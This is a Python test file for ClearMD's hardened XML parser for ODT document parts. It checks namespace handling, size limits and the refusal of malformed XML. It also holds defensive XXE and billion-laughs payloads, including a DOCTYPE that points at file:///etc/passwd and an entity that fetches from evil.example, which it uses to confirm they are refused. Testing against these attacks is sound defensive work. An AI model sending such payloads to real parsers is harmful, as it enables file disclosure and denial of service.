"""The XML tree of untrusted parts: ClearMD's limits, never a DOCTYPE (ADR-0024, AC-16, AC-17)."""

import time

import pytest

from clearmd.backend.services.conversion.odt.xmltree import (
    Element,
    XmlLimits,
    XmlRefused,
    parse_part,
)

TEXT_NS = 'xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0"'


def _p(body: str) -> bytes:
    return f'<?xml version="1.0" encoding="UTF-8"?><text:p {TEXT_NS}>{body}</text:p>'.encode()


def test_names_are_short_and_text_is_mixed() -> None:
    root = parse_part(_p('a<text:span text:style-name="T1">b</text:span>c'))
    assert root.tag == "text:p"
    assert root.children[0] == "a" and root.children[2] == "c"
    span = root.children[1]
    assert isinstance(span, Element) and span.tag == "text:span"
    assert span.get("text:style-name") == "T1" and span.text() == "b"
    assert root.text() == "abc"


def test_mathml_in_its_default_namespace_gets_the_math_prefix() -> None:
    root = parse_part(b'<math xmlns="http://www.w3.org/1998/Math/MathML"><mi>x</mi></math>')
    assert root.tag == "math:math" and isinstance(root.children[0], Element)
    assert root.children[0].tag == "math:mi"


def test_an_unknown_namespace_keeps_its_uri() -> None:
    root = parse_part(b'<a xmlns="urn:x"><b/></a>')
    assert root.tag == "{urn:x}a"


@pytest.mark.parametrize(
    "data",
    [
        b'<?xml version="1.0"?><!DOCTYPE p><p/>',
        b'<?xml version="1.0"?><!DOCTYPE p [<!ENTITY a "x">]><p>&a;</p>',
        b'<?xml version="1.0"?><!DOCTYPE p SYSTEM "file:///etc/passwd"><p/>',
        b'<?xml version="1.0"?><!DOCTYPE p [<!ENTITY % e SYSTEM "http://evil.example/e">%e;]><p/>',
    ],
)
def test_a_doctype_or_an_entity_is_refused_before_anything_expands(data: bytes) -> None:
    with pytest.raises(XmlRefused):
        parse_part(data)


def test_a_billion_laughs_is_refused_at_once() -> None:
    entities = '<!ENTITY l0 "ha">' + "".join(
        f'<!ENTITY l{n} "{("&l" + str(n - 1) + ";") * 10}">' for n in range(1, 10)
    )
    started = time.monotonic()
    with pytest.raises(XmlRefused):
        parse_part(f'<?xml version="1.0"?><!DOCTYPE p [{entities}]><p>&l9;</p>'.encode())
    assert time.monotonic() - started < 1


@pytest.mark.parametrize(
    ("data", "limits"),
    [
        (_p("<text:span>" * 300 + "x" + "</text:span>" * 300), XmlLimits(max_depth=256)),
        (_p("<text:s/>" * 1001), XmlLimits(max_elements=1000)),
        (_p("x" * 1001), XmlLimits(max_characters=1000)),
    ],
)
def test_parts_over_the_limits_are_refused(data: bytes, limits: XmlLimits) -> None:
    with pytest.raises(XmlRefused):
        parse_part(data, limits)


def test_deep_nesting_is_refused_quickly_without_recursion() -> None:
    deep = _p("<text:span>" * 20_000 + "x" + "</text:span>" * 20_000)
    started = time.monotonic()
    with pytest.raises(XmlRefused):
        parse_part(deep)
    assert time.monotonic() - started < 2


@pytest.mark.parametrize("data", [b"", b"<p>", b"<p></q>", b"\xff\xfe<p/>", b"<p>&nope;</p>"])
def test_broken_xml_is_refused(data: bytes) -> None:
    with pytest.raises(XmlRefused):
        parse_part(data)


def test_a_wide_document_under_the_limits_is_read() -> None:
    root = parse_part(_p("<text:s/>" * 100_000))
    assert len(root.children) == 100_000
